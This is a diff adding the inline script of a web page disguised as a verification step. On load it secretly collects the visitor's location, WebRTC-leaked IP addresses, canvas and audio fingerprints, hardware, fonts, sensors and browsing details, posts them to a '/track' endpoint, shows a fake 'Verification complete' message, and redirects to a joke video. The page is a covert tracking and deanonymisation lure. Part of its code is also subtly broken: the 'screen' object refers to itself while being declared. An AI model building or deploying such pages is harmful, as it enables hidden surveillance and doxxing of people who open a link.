@@ -427,4 +427,111 @@
             updateProgress('⚡ Measuring performance...');
             const performance = getPerformanceMetrics();
             
-            updateProgress('🖥️ Gathering hardware info
+            updateProgress('🖥️ Gathering hardware info...');
+            const hardware = getHardwareInfo();
+            
+            // Screen info
+            const screen = {
+                width: screen.width,
+                height: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelRatio: window.devicePixelRatio,
+                orientation: screen.orientation ? screen.orientation.type : 'unknown'
+            };
+            
+            // Browser info
+            const browser = {
+                name: navigator.browserName || 'unknown',
+                version: navigator.browserVersion || 'unknown'
+            };
+            
+            return {
+                sessionId: getSessionId(),
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                referrer: document.referrer || 'Direct',
+                location: location,
+                battery: battery,
+                webRTCIPs: webRTCIPs,
+                canvasFingerprint: canvasFP,
+                audioFingerprint: audioFP,
+                webgl: webgl,
+                fonts: fonts,
+                plugins: plugins,
+                sensors: sensors,
+                network: network,
+                performance: performance,
+                hardware: hardware,
+                screen: screen,
+                browser: browser,
+                tabVisibility: tabVisibilityCount,
+                historyDepth: history.length,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset()
+            };
+        }
+
+        // --- SEND DATA ---
+        async function sendData(data) {
+            try {
+                const response = await fetch('/track', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                return await response.json();
+            } catch (e) {
+                console.error('Send error:', e);
+                return null;
+            }
+        }
+
+        // --- REDIRECT ---
+        function redirectToGif() {
+            const videoUrl = "https://media.tenor.com/58dr_S9uXqEAAAPo/car-car-edit.mp4";
+            window.location.href = videoUrl;
+        }
+
+        // --- MAIN ---
+        async function main() {
+            const statusEl = document.getElementById('status');
+            const loaderEl = document.getElementById('loader');
+            const checkMarkEl = document.getElementById('checkMark');
+            const errorMarkEl = document.getElementById('errorMark');
+            
+            try {
+                updateStatus('📍 Collecting data...');
+                const data = await collectAllData();
+                
+                updateStatus('📤 Sending to server...');
+                const result = await sendData(data);
+                
+                if (result && result.status === 'success') {
+                    loaderEl.style.display = 'none';
+                    checkMarkEl.style.display = 'block';
+                    updateStatus('✅ Verification complete! Redirecting...');
+                    statusEl.style.color = '#48bb78';
+                } else {
+                    loaderEl.style.display = 'none';
+                    errorMarkEl.style.display = 'block';
+                    updateStatus('⚠️ Continuing...');
+                    statusEl.style.color = '#ed8936';
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                loaderEl.style.display = 'none';
+                errorMarkEl.style.display = 'block';
+                updateStatus('⚠️ Continuing...');
+                statusEl.style.color = '#ed8936';
+            }
+            
+            setTimeout(redirectToGif, 2000);
+        }
+
+        // Start
+        main();
+    </script>
+</body>
+</html>
